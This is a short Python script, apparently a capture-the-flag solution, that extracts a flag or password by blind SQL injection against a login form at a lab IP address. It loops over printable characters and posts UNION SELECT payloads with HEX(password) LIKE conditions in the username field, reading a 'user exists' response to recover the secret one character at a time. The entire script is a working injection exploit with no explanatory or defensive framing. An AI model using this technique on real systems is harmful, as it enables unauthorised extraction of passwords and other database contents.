#!/usr/bin/env python2
from __future__ import print_function
import requests
import os
import sys

os.system('clear')
pas = 'SPRITZ{'
for i in range(50):
    for j in range(0x20, 0x7f):
        r = requests.post("http://172.16.4.144:4053/?", data = {'username': '1\' UNION SELECT * FROM users WHERE HEX(password) LIKE \'' + (pas + chr(j)).encode('hex') + '%'})
        print('\033[F' + pas + chr(j))
        if 'user exists' in r.content:
            pas += chr(j)
